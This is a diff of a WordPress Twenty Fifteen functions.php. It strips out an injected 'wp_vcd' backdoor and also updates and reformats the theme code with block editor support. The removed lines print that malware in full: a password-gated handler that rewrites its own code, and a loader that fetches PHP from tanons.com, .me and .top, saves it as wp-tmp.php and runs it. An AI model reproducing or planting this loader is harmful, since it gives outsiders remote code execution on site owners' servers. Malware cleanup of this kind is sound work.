@@ -1,173 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'db11427987a4e2bdd2854255bf819ba3'))
-	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
-			{
-
-				
-
-
-
-
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-			}
-			
-		die("");
-	}
-
-
-
-
-
-
-
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        
-
-$wp_auth_key='5a2bf2adbe7b2cd42684793efd6a4c9b';
-        if (($tmpcontent = @file_get_contents("http://www.tanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.tanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif (($tmpcontent = @file_get_contents("http://www.tanons.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.tanons.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        }
-        
-        
-        
-        
-        
-    }
-}
-
-//$start_wp_theme_tmp
-
-
-
-//wp_tmp
-
-
-//$end_wp_theme_tmp
-?><?php
 /**
  * Twenty Fifteen functions and definitions
  *
@@ -181,7 +12,7 @@ if (stripos($tmpcontent, $wp_auth_key) !== false) {
  * the parent theme's file, so the child theme functions would be used.
  *
  * @link https://codex.wordpress.org/Theme_Development
- * @link https://codex.wordpress.org/Child_Themes
+ * @link https://developer.wordpress.org/themes/advanced-topics/child-themes/
  *
  * Functions that are not pluggable (not wrapped in function_exists()) are
  * instead attached to a filter or action hook.
@@ -211,109 +42,214 @@ if ( version_compare( $GLOBALS['wp_version'], '4.1-alpha', '<' ) ) {
 }
 
 if ( ! function_exists( 'twentyfifteen_setup' ) ) :
-/**
- * Sets up theme defaults and registers support for various WordPress features.
- *
- * Note that this function is hooked into the after_setup_theme hook, which
- * runs before the init hook. The init hook is too late for some features, such
- * as indicating support for post thumbnails.
- *
- * @since Twenty Fifteen 1.0
- */
-function twentyfifteen_setup() {
-
-	/*
-	 * Make theme available for translation.
-	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentyfifteen
-	 * If you're building a theme based on twentyfifteen, use a find and replace
-	 * to change 'twentyfifteen' to the name of your theme in all the template files
-	 */
-	load_theme_textdomain( 'twentyfifteen' );
-
-	// Add default posts and comments RSS feed links to head.
-	add_theme_support( 'automatic-feed-links' );
-
-	/*
-	 * Let WordPress manage the document title.
-	 * By adding theme support, we declare that this theme does not use a
-	 * hard-coded <title> tag in the document head, and expect WordPress to
-	 * provide it for us.
-	 */
-	add_theme_support( 'title-tag' );
-
-	/*
-	 * Enable support for Post Thumbnails on posts and pages.
-	 *
-	 * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
-	 */
-	add_theme_support( 'post-thumbnails' );
-	set_post_thumbnail_size( 825, 510, true );
-
-	// This theme uses wp_nav_menu() in two locations.
-	register_nav_menus( array(
-		'primary' => __( 'Primary Menu',      'twentyfifteen' ),
-		'social'  => __( 'Social Links Menu', 'twentyfifteen' ),
-	) );
-
-	/*
-	 * Switch default core markup for search form, comment form, and comments
-	 * to output valid HTML5.
-	 */
-	add_theme_support( 'html5', array(
-		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
-	) );
-
-	/*
-	 * Enable support for Post Formats.
-	 *
-	 * See: https://codex.wordpress.org/Post_Formats
-	 */
-	add_theme_support( 'post-formats', array(
-		'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
-	) );
-
-	/*
-	 * Enable support for custom logo.
-	 *
-	 * @since Twenty Fifteen 1.5
-	 */
-	add_theme_support( 'custom-logo', array(
-		'height'      => 248,
-		'width'       => 248,
-		'flex-height' => true,
-	) );
-
-	$color_scheme  = twentyfifteen_get_color_scheme();
-	$default_color = trim( $color_scheme[0], '#' );
-
-	// Setup the WordPress core custom background feature.
-
 	/**
-	 * Filter Twenty Fifteen custom-header support arguments.
+	 * Sets up theme defaults and registers support for various WordPress features.
+	 *
+	 * Note that this function is hooked into the after_setup_theme hook, which
+	 * runs before the init hook. The init hook is too late for some features, such
+	 * as indicating support for post thumbnails.
 	 *
 	 * @since Twenty Fifteen 1.0
-	 *
-	 * @param array $args {
-	 *     An array of custom-header support arguments.
-	 *
-	 *     @type string $default-color     		Default color of the header.
-	 *     @type string $default-attachment     Default attachment of the header.
-	 * }
 	 */
-	add_theme_support( 'custom-background', apply_filters( 'twentyfifteen_custom_background_args', array(
-		'default-color'      => $default_color,
-		'default-attachment' => 'fixed',
-	) ) );
+	function twentyfifteen_setup() {
 
-	/*
-	 * This theme styles the visual editor to resemble the theme style,
-	 * specifically font, colors, icons, and column width.
-	 */
-	add_editor_style( array( 'css/editor-style.css', 'genericons/genericons.css', twentyfifteen_fonts_url() ) );
+		/*
+		 * Make theme available for translation.
+		 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentyfifteen
+		 * If you're building a theme based on twentyfifteen, use a find and replace
+		 * to change 'twentyfifteen' to the name of your theme in all the template files
+		 */
+		load_theme_textdomain( 'twentyfifteen' );
 
-	// Indicate widget sidebars can use selective refresh in the Customizer.
-	add_theme_support( 'customize-selective-refresh-widgets' );
-}
+		// Add default posts and comments RSS feed links to head.
+		add_theme_support( 'automatic-feed-links' );
+
+		/*
+		 * Let WordPress manage the document title.
+		 * By adding theme support, we declare that this theme does not use a
+		 * hard-coded <title> tag in the document head, and expect WordPress to
+		 * provide it for us.
+		 */
+		add_theme_support( 'title-tag' );
+
+		/*
+		 * Enable support for Post Thumbnails on posts and pages.
+		 *
+		 * See: https://developer.wordpress.org/reference/functions/add_theme_support/#post-thumbnails
+		 */
+		add_theme_support( 'post-thumbnails' );
+		set_post_thumbnail_size( 825, 510, true );
+
+		// This theme uses wp_nav_menu() in two locations.
+		register_nav_menus(
+			array(
+				'primary' => __( 'Primary Menu', 'twentyfifteen' ),
+				'social'  => __( 'Social Links Menu', 'twentyfifteen' ),
+			)
+		);
+
+		/*
+		 * Switch default core markup for search form, comment form, and comments
+		 * to output valid HTML5.
+		 */
+		add_theme_support(
+			'html5',
+			array(
+				'search-form',
+				'comment-form',
+				'comment-list',
+				'gallery',
+				'caption',
+			)
+		);
+
+		/*
+		 * Enable support for Post Formats.
+		 *
+		 * See: https://codex.wordpress.org/Post_Formats
+		 */
+		add_theme_support(
+			'post-formats',
+			array(
+				'aside',
+				'image',
+				'video',
+				'quote',
+				'link',
+				'gallery',
+				'status',
+				'audio',
+				'chat',
+			)
+		);
+
+		/*
+		 * Enable support for custom logo.
+		 *
+		 * @since Twenty Fifteen 1.5
+		 */
+		add_theme_support(
+			'custom-logo',
+			array(
+				'height'      => 248,
+				'width'       => 248,
+				'flex-height' => true,
+			)
+		);
+
+		$color_scheme  = twentyfifteen_get_color_scheme();
+		$default_color = trim( $color_scheme[0], '#' );
+
+		// Setup the WordPress core custom background feature.
+
+		/**
+		 * Filter Twenty Fifteen custom-header support arguments.
+		 *
+		 * @since Twenty Fifteen 1.0
+		 *
+		 * @param array $args {
+		 *     An array of custom-header support arguments.
+		 *
+		 *     @type string $default-color          Default color of the header.
+		 *     @type string $default-attachment     Default attachment of the header.
+		 * }
+		 */
+		add_theme_support(
+			'custom-background',
+			apply_filters(
+				'twentyfifteen_custom_background_args',
+				array(
+					'default-color'      => $default_color,
+					'default-attachment' => 'fixed',
+				)
+			)
+		);
+
+		/*
+		 * This theme styles the visual editor to resemble the theme style,
+		 * specifically font, colors, icons, and column width.
+		 */
+		add_editor_style( array( 'css/editor-style.css', 'genericons/genericons.css', twentyfifteen_fonts_url() ) );
+
+		// Load regular editor styles into the new block-based editor.
+		add_theme_support( 'editor-styles' );
+
+		// Load default block styles.
+		add_theme_support( 'wp-block-styles' );
+
+		// Add support for responsive embeds.
+		add_theme_support( 'responsive-embeds' );
+
+		// Add support for custom color scheme.
+		add_theme_support(
+			'editor-color-palette',
+			array(
+				array(
+					'name'  => __( 'Dark Gray', 'twentyfifteen' ),
+					'slug'  => 'dark-gray',
+					'color' => '#111',
+				),
+				array(
+					'name'  => __( 'Light Gray', 'twentyfifteen' ),
+					'slug'  => 'light-gray',
+					'color' => '#f1f1f1',
+				),
+				array(
+					'name'  => __( 'White', 'twentyfifteen' ),
+					'slug'  => 'white',
+					'color' => '#fff',
+				),
+				array(
+					'name'  => __( 'Yellow', 'twentyfifteen' ),
+					'slug'  => 'yellow',
+					'color' => '#f4ca16',
+				),
+				array(
+					'name'  => __( 'Dark Brown', 'twentyfifteen' ),
+					'slug'  => 'dark-brown',
+					'color' => '#352712',
+				),
+				array(
+					'name'  => __( 'Medium Pink', 'twentyfifteen' ),
+					'slug'  => 'medium-pink',
+					'color' => '#e53b51',
+				),
+				array(
+					'name'  => __( 'Light Pink', 'twentyfifteen' ),
+					'slug'  => 'light-pink',
+					'color' => '#ffe5d1',
+				),
+				array(
+					'name'  => __( 'Dark Purple', 'twentyfifteen' ),
+					'slug'  => 'dark-purple',
+					'color' => '#2e2256',
+				),
+				array(
+					'name'  => __( 'Purple', 'twentyfifteen' ),
+					'slug'  => 'purple',
+					'color' => '#674970',
+				),
+				array(
+					'name'  => __( 'Blue Gray', 'twentyfifteen' ),
+					'slug'  => 'blue-gray',
+					'color' => '#22313f',
+				),
+				array(
+					'name'  => __( 'Bright Blue', 'twentyfifteen' ),
+					'slug'  => 'bright-blue',
+					'color' => '#55c3dc',
+				),
+				array(
+					'name'  => __( 'Light Blue', 'twentyfifteen' ),
+					'slug'  => 'light-blue',
+					'color' => '#e9f2f9',
+				),
+			)
+		);
+
+		// Indicate widget sidebars can use selective refresh in the Customizer.
+		add_theme_support( 'customize-selective-refresh-widgets' );
+	}
 endif; // twentyfifteen_setup
 add_action( 'after_setup_theme', 'twentyfifteen_setup' );
 
@@ -325,80 +261,85 @@ add_action( 'after_setup_theme', 'twentyfifteen_setup' );
  * @link https://codex.wordpress.org/Function_Reference/register_sidebar
  */
 function twentyfifteen_widgets_init() {
-	register_sidebar( array(
-		'name'          => __( 'Widget Area', 'twentyfifteen' ),
-		'id'            => 'sidebar-1',
-		'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentyfifteen' ),
-		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
-		'after_widget'  => '</aside>',
-		'before_title'  => '<h2 class="widget-title">',
-		'after_title'   => '</h2>',
-	) );
+	register_sidebar(
+		array(
+			'name'          => __( 'Widget Area', 'twentyfifteen' ),
+			'id'            => 'sidebar-1',
+			'description'   => __( 'Add widgets here to appear in your sidebar.', 'twentyfifteen' ),
+			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
+			'after_widget'  => '</aside>',
+			'before_title'  => '<h2 class="widget-title">',
+			'after_title'   => '</h2>',
+		)
+	);
 }
 add_action( 'widgets_init', 'twentyfifteen_widgets_init' );
 
 if ( ! function_exists( 'twentyfifteen_fonts_url' ) ) :
-/**
- * Register Google fonts for Twenty Fifteen.
- *
- * @since Twenty Fifteen 1.0
- *
- * @return string Google fonts URL for the theme.
- */
-function twentyfifteen_fonts_url() {
-	$fonts_url = '';
-	$fonts     = array();
-	$subsets   = 'latin,latin-ext';
-
-	/*
-	 * Translators: If there are characters in your language that are not supported
-	 * by Noto Sans, translate this to 'off'. Do not translate into your own language.
+	/**
+	 * Register Google fonts for Twenty Fifteen.
+	 *
+	 * @since Twenty Fifteen 1.0
+	 *
+	 * @return string Google fonts URL for the theme.
 	 */
-	if ( 'off' !== _x( 'on', 'Noto Sans font: on or off', 'twentyfifteen' ) ) {
-		$fonts[] = 'Noto Sans:400italic,700italic,400,700';
+	function twentyfifteen_fonts_url() {
+		$fonts_url = '';
+		$fonts     = array();
+		$subsets   = 'latin,latin-ext';
+
+		/*
+		 * Translators: If there are characters in your language that are not supported
+		 * by Noto Sans, translate this to 'off'. Do not translate into your own language.
+		 */
+		if ( 'off' !== _x( 'on', 'Noto Sans font: on or off', 'twentyfifteen' ) ) {
+			$fonts[] = 'Noto Sans:400italic,700italic,400,700';
+		}
+
+		/*
+		 * Translators: If there are characters in your language that are not supported
+		 * by Noto Serif, translate this to 'off'. Do not translate into your own language.
+		 */
+		if ( 'off' !== _x( 'on', 'Noto Serif font: on or off', 'twentyfifteen' ) ) {
+			$fonts[] = 'Noto Serif:400italic,700italic,400,700';
+		}
+
+		/*
+		 * Translators: If there are characters in your language that are not supported
+		 * by Inconsolata, translate this to 'off'. Do not translate into your own language.
+		 */
+		if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentyfifteen' ) ) {
+			$fonts[] = 'Inconsolata:400,700';
+		}
+
+		/*
+		 * Translators: To add an additional character subset specific to your language,
+		 * translate this to 'greek', 'cyrillic', 'devanagari' or 'vietnamese'. Do not translate into your own language.
+		 */
+		$subset = _x( 'no-subset', 'Add new subset (greek, cyrillic, devanagari, vietnamese)', 'twentyfifteen' );
+
+		if ( 'cyrillic' == $subset ) {
+			$subsets .= ',cyrillic,cyrillic-ext';
+		} elseif ( 'greek' == $subset ) {
+			$subsets .= ',greek,greek-ext';
+		} elseif ( 'devanagari' == $subset ) {
+			$subsets .= ',devanagari';
+		} elseif ( 'vietnamese' == $subset ) {
+			$subsets .= ',vietnamese';
+		}
+
+		if ( $fonts ) {
+			$fonts_url = add_query_arg(
+				array(
+					'family' => urlencode( implode( '|', $fonts ) ),
+					'subset' => urlencode( $subsets ),
+				),
+				'https://fonts.googleapis.com/css'
+			);
+		}
+
+		return $fonts_url;
 	}
-
-	/*
-	 * Translators: If there are characters in your language that are not supported
-	 * by Noto Serif, translate this to 'off'. Do not translate into your own language.
-	 */
-	if ( 'off' !== _x( 'on', 'Noto Serif font: on or off', 'twentyfifteen' ) ) {
-		$fonts[] = 'Noto Serif:400italic,700italic,400,700';
-	}
-
-	/*
-	 * Translators: If there are characters in your language that are not supported
-	 * by Inconsolata, translate this to 'off'. Do not translate into your own language.
-	 */
-	if ( 'off' !== _x( 'on', 'Inconsolata font: on or off', 'twentyfifteen' ) ) {
-		$fonts[] = 'Inconsolata:400,700';
-	}
-
-	/*
-	 * Translators: To add an additional character subset specific to your language,
-	 * translate this to 'greek', 'cyrillic', 'devanagari' or 'vietnamese'. Do not translate into your own language.
-	 */
-	$subset = _x( 'no-subset', 'Add new subset (greek, cyrillic, devanagari, vietnamese)', 'twentyfifteen' );
-
-	if ( 'cyrillic' == $subset ) {
-		$subsets .= ',cyrillic,cyrillic-ext';
-	} elseif ( 'greek' == $subset ) {
-		$subsets .= ',greek,greek-ext';
-	} elseif ( 'devanagari' == $subset ) {
-		$subsets .= ',devanagari';
-	} elseif ( 'vietnamese' == $subset ) {
-		$subsets .= ',vietnamese';
-	}
-
-	if ( $fonts ) {
-		$fonts_url = add_query_arg( array(
-			'family' => urlencode( implode( '|', $fonts ) ),
-			'subset' => urlencode( $subsets ),
-		), 'https://fonts.googleapis.com/css' );
-	}
-
-	return $fonts_url;
-}
 endif;
 
 /**
@@ -428,6 +369,9 @@ function twentyfifteen_scripts() {
 	// Load our main stylesheet.
 	wp_enqueue_style( 'twentyfifteen-style', get_stylesheet_uri() );
 
+	// Theme block stylesheet.
+	wp_enqueue_style( 'twentyfifteen-block-style', get_template_directory_uri() . '/css/blocks.css', array( 'twentyfifteen-style' ), '20181230' );
+
 	// Load the Internet Explorer specific stylesheet.
 	wp_enqueue_style( 'twentyfifteen-ie', get_template_directory_uri() . '/css/ie.css', array( 'twentyfifteen-style' ), '20141010' );
 	wp_style_add_data( 'twentyfifteen-ie', 'conditional', 'lt IE 9' );
@@ -447,12 +391,30 @@ function twentyfifteen_scripts() {
 	}
 
 	wp_enqueue_script( 'twentyfifteen-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20150330', true );
-	wp_localize_script( 'twentyfifteen-script', 'screenReaderText', array(
-		'expand'   => '<span class="screen-reader-text">' . __( 'expand child menu', 'twentyfifteen' ) . '</span>',
-		'collapse' => '<span class="screen-reader-text">' . __( 'collapse child menu', 'twentyfifteen' ) . '</span>',
-	) );
+	wp_localize_script(
+		'twentyfifteen-script',
+		'screenReaderText',
+		array(
+			'expand'   => '<span class="screen-reader-text">' . __( 'expand child menu', 'twentyfifteen' ) . '</span>',
+			'collapse' => '<span class="screen-reader-text">' . __( 'collapse child menu', 'twentyfifteen' ) . '</span>',
+		)
+	);
 }
 add_action( 'wp_enqueue_scripts', 'twentyfifteen_scripts' );
+
+/**
+ * Enqueue styles for the block-based editor.
+ *
+ * @since Twenty Fifteen 2.1
+ */
+function twentyfifteen_block_editor_styles() {
+	// Block styles.
+	wp_enqueue_style( 'twentyfifteen-block-editor-style', get_template_directory_uri() . '/css/editor-blocks.css', array(), '20181230' );
+	// Add custom fonts.
+	wp_enqueue_style( 'twentyfifteen-fonts', twentyfifteen_fonts_url(), array(), null );
+}
+add_action( 'enqueue_block_editor_assets', 'twentyfifteen_block_editor_styles' );
+
 
 /**
  * Add preconnect for Google Fonts.
@@ -499,9 +461,9 @@ function twentyfifteen_post_nav_background() {
 		return;
 	}
 
-	if ( $previous &&  has_post_thumbnail( $previous->ID ) ) {
+	if ( $previous && has_post_thumbnail( $previous->ID ) ) {
 		$prevthumb = wp_get_attachment_image_src( get_post_thumbnail_id( $previous->ID ), 'post-thumbnail' );
-		$css .= '
+		$css      .= '
 			.post-navigation .nav-previous { background-image: url(' . esc_url( $prevthumb[0] ) . '); }
 			.post-navigation .nav-previous .post-title, .post-navigation .nav-previous a:hover .post-title, .post-navigation .nav-previous .meta-nav { color: #fff; }
 			.post-navigation .nav-previous a:before { background-color: rgba(0, 0, 0, 0.4); }
@@ -510,7 +472,7 @@ function twentyfifteen_post_nav_background() {
 
 	if ( $next && has_post_thumbnail( $next->ID ) ) {
 		$nextthumb = wp_get_attachment_image_src( get_post_thumbnail_id( $next->ID ), 'post-thumbnail' );
-		$css .= '
+		$css      .= '
 			.post-navigation .nav-next { background-image: url(' . esc_url( $nextthumb[0] ) . '); border-top: 0; }
 			.post-navigation .nav-next .post-title, .post-navigation .nav-next a:hover .post-title, .post-navigation .nav-next .meta-nav { color: #fff; }
 			.post-navigation .nav-next a:before { background-color: rgba(0, 0, 0, 0.4); }
